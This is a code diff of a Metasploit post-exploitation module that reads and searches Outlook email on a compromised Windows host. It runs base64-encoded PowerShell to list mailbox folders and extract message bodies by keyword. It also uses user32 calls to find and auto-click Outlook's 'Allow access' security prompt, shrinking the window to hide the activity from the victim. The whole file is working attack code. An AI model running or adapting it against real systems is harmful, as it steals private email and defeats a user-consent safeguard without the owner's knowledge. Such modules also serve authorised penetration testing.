@@ -4,150 +4,163 @@
 ##
 
 require 'msf/core'
-require 'msf/core/post/windows/registry'
 require 'iconv'
-require 'base64'
 
 class Metasploit3 < Msf::Post
 
-	include Msf::Post::Windows::Registry
+  include Msf::Post::Windows::Registry
 
         A_HASH = { "en_US" => "Allow", "NL" => "Toestaan" }
         ACF_HASH = { "en_US" => "Allow access for", "NL" => "Toegang geven voor" }
 
-	def initialize(info={})
-		super(update_info(info,
-		'Name'          => 'Windows gather/search Outlook e-mailmessages',
-		'Description'   => %q{
-			This module allows you to read and search e-mailmessages from the local Outlook installation using powershell. Please note that this module is manipulating the victims keyboard/mouse.
-			If a victim is behind the target system, he might detect your activity. Tested on Windows 8.1 x64 with Office 2013.
-		},
-		'License'       => MSF_LICENSE,
-		'Author'        => [ 'Wesley Neelen <security[at]forsec.nl>' ],
-		'Platform'      => [ 'win' ],
-		'Arch'		=> [ 'x86', 'x64' ],
-		'SessionTypes'  => [ 'meterpreter']
-	))
+  def initialize(info={})
+    super(update_info(info,
+    'Name'          => 'Windows Gather Outlook Email Messages',
+    'Description'   => %q{
+      This module allows you to read and search email messages from the local Outlook installation using powershell. Please note that this module is manipulating the victims keyboard/mouse.
+      If a victim is behind the target system, he might notice the activities of this module. Tested on Windows 8.1 x64 with Office 2013.
+    },
+    'License'       => MSF_LICENSE,
+    'Author'        => [ 'Wesley Neelen <security[at]forsec.nl>' ],
+    'Platform'      => [ 'win' ],
+    'Arch'		=> [ 'x86', 'x64' ],
+    'SessionTypes'  => [ 'meterpreter']
+  ))
 
-	register_options(
-	[
-		OptBool.new('LIST_FOLDERS', [ true, ' List the available folders', true]),
-		OptString.new('FOLDER', [ false, ' The e-mailfolder to read (e.g. Inbox)' ]),
-		OptString.new('KEYWORD', [ false, ' Search e-mails by the keyword specified here' ]),
-		OptString.new('A_TRANSLATION', [ false, ' Fill in the translation of the word "Allow" in the targets system language, to click on the security popup.' ]),
-		OptString.new('ACF_TRANSLATION', [ false, ' Fill in the translation of the phrase "Allow access for" in the targets system language, to click on the security popup.' ]),
-		], self.class)
-	end
+  register_options(
+  [
+    OptBool.new('LIST_FOLDERS', [ true, ' List the available folders', true]),
+    OptString.new('FOLDER', [ false, ' The e-mailfolder to read (e.g. Inbox)' ]),
+    OptString.new('KEYWORD', [ false, ' Search e-mails by the keyword specified here' ]),
+    OptString.new('A_TRANSLATION', [ false, ' Fill in the translation of the word "Allow" in the targets system language, to click on the security popup.' ]),
+    OptString.new('ACF_TRANSLATION', [ false, ' Fill in the translation of the phrase "Allow access for" in the targets system language, to click on the security popup.' ]),
+    ], self.class)
+  end
 
 
-	def listBoxes
-		# This function prints a listing of available mailbox folders
-		listBoxes_res = cmd_exec('powershell', '-enc ZgB1AG4AYwB0AGkAbwBuACAATABpAHMAdAAtAEYAbwBsAGQAZQByACAAewAKACAAIAAgACAAQwBsAGUAYQByAC0AaABvAHMAdAAKACAAIAAgACAAQQBkAGQALQBUAHkAcABlACAALQBBAHMAcwBlAG0AYgBsAHkAIAAiAE0AaQBjAHIAbwBzAG8AZgB0AC4ATwBmAGYAaQBjAGUALgBJAG4AdABlAHIAbwBwAC4ATwB1AHQAbABvAG8AawAiAAoAIAAgACAAIAAkAE8AdQB0AGwAbwBvAGsAIAA9ACAATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AQwBvAG0ATwBiAGoAZQBjAHQAIABPAHUAdABsAG8AbwBrAC4AQQBwAHAAbABpAGMAYQB0AGkAbwBuAAoAIAAgACAAIAAkAE4AYQBtAGUAcwBwAGEAYwBlACAAPQAgACQATwB1AHQAbABvAG8AawAuAEcAZQB0AE4AYQBtAGUAUwBwAGEAYwBlACgAIgBNAEEAUABJACIAKQAKACAAIAAgACAAJABOAGEAbQBlAFMAcABhAGMAZQAuAEYAbwBsAGQAZQByAHMALgBJAHQAZQBtACgAMQApAC4ARgBvAGwAZABlAHIAcwAgAHwAIABGAFQAIABGAG8AbABkAGUAcgBQAGEAdABoAAoAfQAKAAoATABpAHMAdAAtAEYAbwBsAGQAZQByAAoA')
-		currentidle = session.ui.idle_time
-		print_status("System has currently been idle for #{currentidle} seconds")
-		print_status listBoxes_res
-	end
+  def listBoxes
+    # This function prints a listing of available mailbox folders
+    psh_script = %Q|
+    function List-Folder {
+    Clear-host
+    Add-Type -Assembly "Microsoft.Office.Interop.Outlook"
+    $Outlook = New-Object -ComObject Outlook.Application
+    $Namespace = $Outlook.GetNameSpace("MAPI")
+    $NameSpace.Folders.Item(1).Folders \| FT FolderPath
+    }
+    List-Folder
+    |
+    utf16conv = Iconv.conv('UTF16LE', 'ASCII', psh_script)
+    encoded_psh = Rex::Text.encode_base64(utf16conv)
+    listBoxes_res = cmd_exec('powershell', '-enc ' + encoded_psh)
+    currentidle = session.ui.idle_time
+    print_status("System has currently been idle for #{currentidle} seconds")
+    print_status listBoxes_res
+  end
 
-	def readEmails(folder,keyword,searchobject,atrans,acftrans)
-		# This functions reads Outlook using powershell scripts
-		view = framework.threads.spawn("ButtonClicker", false) {
-			clickButton(atrans,acftrans)
-		}
-		psh_script = "function Get-Emails {\n"
-    		psh_script += "	param ([String]$searchTerm,[String]$Folder,[String]$searchObject)\n"
-    		psh_script += "	Add-Type -Assembly \"Microsoft.Office.Interop.Outlook\"\n"
-    		psh_script += "	$Outlook = New-Object -ComObject Outlook.Application\n"
-    		psh_script += "	$Namespace = $Outlook.GetNameSpace(\"MAPI\")\n"
-    		psh_script += "	$NameSpace.Folders.Item(1)\n"
-   		psh_script += "	$Email = $NameSpace.Folders.Item(1).Folders.Item($Folder).Items\n"
-    		psh_script += " $Email | Where-Object {$_.$searchObject -like '*' + $searchTerm + '*'}\n"
-		psh_script += " Write-Host $Email\n"
-		psh_script += "}\n"
-		psh_script += "\n"
-		psh_script += "Get-Emails \"" + keyword + "\" \"" + folder + "\" \"" + searchobject + "\"\n"
-		utf16conv = Iconv.conv('UTF16LE', 'ASCII', psh_script)
-		encoded_psh = Base64.encode64(utf16conv)
-		readEmails_res = cmd_exec('powershell', '-enc ' + encoded_psh)
-		print_status readEmails_res
-	end
+  def readEmails(folder,keyword,searchobject,atrans,acftrans)
+    # This functions reads Outlook using powershell scripts
+    view = framework.threads.spawn("ButtonClicker", false) {
+      clickButton(atrans,acftrans)
+    }
+    psh_script = %Q|
+      function Get-Emails {
+      param ([String]$searchTerm,[String]$Folder,[String]$searchObject)
+      Add-Type -Assembly "Microsoft.Office.Interop.Outlook"
+      $Outlook = New-Object -ComObject Outlook.Application
+      $Namespace = $Outlook.GetNameSpace("MAPI")
+      $NameSpace.Folders.Item(1)
+      $Email = $NameSpace.Folders.Item(1).Folders.Item($Folder).Items
+      $Email \| Where-Object {$_.$searchObject -like '*' + $searchTerm + '*'}
+      Write-Host $Email
+      }
+      Get-Emails "#{keyword}" "#{folder}" "#{searchobject}"
+    |
+    utf16conv = Iconv.conv('UTF16LE', 'ASCII', psh_script)
+    encoded_psh = Rex::Text.encode_base64(utf16conv)
+    readEmails_res = cmd_exec('powershell', '-enc ' + encoded_psh)
+    print_status readEmails_res
+  end
 
-	def clickButton(atrans,acftrans)
-		# This functions clicks on the security notification generated by Outlook.
-		sleep 1
-		hwnd = client.railgun.user32.FindWindowW(nil, "Microsoft Outlook")
-		hwndChildCk = client.railgun.user32.FindWindowExW(hwnd['return'], nil, "Button", "&#{acftrans}")
-		client.railgun.user32.SendMessageW(hwndChildCk['return'], 0x00F1, 1, nil)
-		client.railgun.user32.MoveWindow(hwnd['return'],150,150,1,1,true)
-		hwndChild = client.railgun.user32.FindWindowExW(hwnd['return'], nil, "Button", "#{atrans}")
-		client.railgun.user32.SetActiveWindow(hwndChild['return'])
-		client.railgun.user32.mouse_event(0x0002,150,150,nil,nil)
-		client.railgun.user32.SendMessageW(hwndChild['return'], 0x00F5, 0, nil)
-	end
+  def clickButton(atrans,acftrans)
+    # This functions clicks on the security notification generated by Outlook.
+    sleep 1
+    hwnd = client.railgun.user32.FindWindowW(nil, "Microsoft Outlook")
+    hwndChildCk = client.railgun.user32.FindWindowExW(hwnd['return'], nil, "Button", "&#{acftrans}")
+    client.railgun.user32.SendMessageW(hwndChildCk['return'], 0x00F1, 1, nil)
+    client.railgun.user32.MoveWindow(hwnd['return'],150,150,1,1,true)
+    hwndChild = client.railgun.user32.FindWindowExW(hwnd['return'], nil, "Button", "#{atrans}")
+    client.railgun.user32.SetActiveWindow(hwndChild['return'])
+    client.railgun.user32.mouse_event(0x0002,150,150,nil,nil)
+    client.railgun.user32.SendMessageW(hwndChild['return'], 0x00F5, 0, nil)
+  end
 
-	def run
-		# Main method
-		list_folder = datastore['LIST_FOLDERS']
-		folder	= datastore['FOLDER']
-		keyword = datastore['KEYWORD']
-		object	= "HTMLBody"
-		allow 	= datastore['A_TRANSLATION']
-		allow_access_for = datastore['ACF_TRANSLATION']
+  def run
+    # Main method
+    list_folder = datastore['LIST_FOLDERS']
+    folder	= datastore['FOLDER']
+    keyword = datastore['KEYWORD'].to_s
+    object	= "HTMLBody"
+    allow 	= datastore['A_TRANSLATION']
+    allow_access_for = datastore['ACF_TRANSLATION']
 
-		if keyword.nil?
-			keyword = ""
-		end
+    # OS language check
+    sysLang = client.sys.config.sysinfo['System Language']
+    if sysLang != "en_US" and sysLang != "NL"
+      if allow.nil? or allow_access_for.nil?
+        print_error ("System language not supported, only English (en-US) and Dutch (NL) are supported, you can specify the targets system translations in the options A_TRANSLATION (Allow) and ACF_TRANSLATION (Allow access for)")
+        abort()
+      else
+        atrans = allow
+        acftrans = allow_access_for
+      end
+    else
+      atrans = A_HASH[sysLang]
+      acftrans = ACF_HASH[sysLang]
+    end
 
-		# OS language check 
-		sysLang = client.sys.config.sysinfo['System Language']
-		if sysLang != "en_US" and sysLang != "NL"
-			if allow.nil? or allow_access_for.nil?
-				print_error ("System language not supported, only English (en-US) and Dutch (NL) are supported, you can specify the targets system translations in the options A_TRANSLATION (Allow) and ACF_TRANSLATION (Allow access for)")
-				return :abort
-			else
-				atrans = allow
-				acftrans = allow_access_for
-			end
-		else
-			atrans = A_HASH[sysLang]
-			acftrans = ACF_HASH[sysLang]
-		end
-		
-		# Outlook installed
-		@key_base = "HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows Messaging Subsystem\\Profiles\\Outlook\\9375CFF0413111d3B88A00104B2A6676" 
-		outlookInstalled = registry_getvaldata("#{@key_base}\\", "NextAccountID")
+    # Outlook installed
+    @key_base = "HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows Messaging Subsystem\\Profiles\\Outlook\\9375CFF0413111d3B88A00104B2A6676"
+    outlookInstalled = registry_getvaldata("#{@key_base}\\", "NextAccountID")
 
-		if outlookInstalled != 0
-			print_good "Outlook is installed"
-		else
-			print_error "Outlook is not installed"
-			return :abort
-		end
+    if !outlookInstalled.nil?
+      if outlookInstalled != 0
+        print_good "Outlook is installed"
+      else
+        print_error "Outlook is not installed"
+        abort()
+      end
+    end
 
-		# Powershell installed check
-		if registry_enumkeys("HKLM\\SOFTWARE\\Microsoft\\").include?("PowerShell")
-			print_good("Powershell is installed on this system.")
-		else
-			print_error("Powershell is not installed")
-			return :abort
-		end	
-			
-		# Check whether target system is locked
-		locked = client.railgun.user32.GetForegroundWindow()['return']
-		if locked == 0
-			print_error("Target system is locked. This post module cannot click on Outlooks security warning when the target system is locked")
-			return :abort
-		end
+    # Powershell installed check
+    powershellInstalled = registry_enumkeys("HKLM\\SOFTWARE\\Microsoft\\").include?("PowerShell")
 
-		if list_folder
-			print_good('Available folders in the mailbox: ')
-			listBoxes()
-		else
-			print_status('Not printing folders, LIST_FOLDERS disabled')
-		end
+    if !powershellInstalled.nil?
+      if powershellInstalled != 0
+        print_good("Powershell is installed on this system.")
+      else
+        print_error("Powershell is not installed")
+        abort()
+      end
+    end
 
-		if folder
-			readEmails(folder,keyword,object,atrans,acftrans)
-		end
-	end
+    # Check whether target system is locked
+    locked = client.railgun.user32.GetForegroundWindow()['return']
+    if locked == 0
+      print_error("Target system is locked. This post module cannot click on Outlooks security warning when the target system is locked")
+      abort()
+    end
+
+    if list_folder
+      print_good('Available folders in the mailbox: ')
+      listBoxes()
+    else
+      print_status('Not printing folders, LIST_FOLDERS disabled')
+    end
+
+    if folder
+      readEmails(folder,keyword,object,atrans,acftrans)
+    end
+  end
 end
 
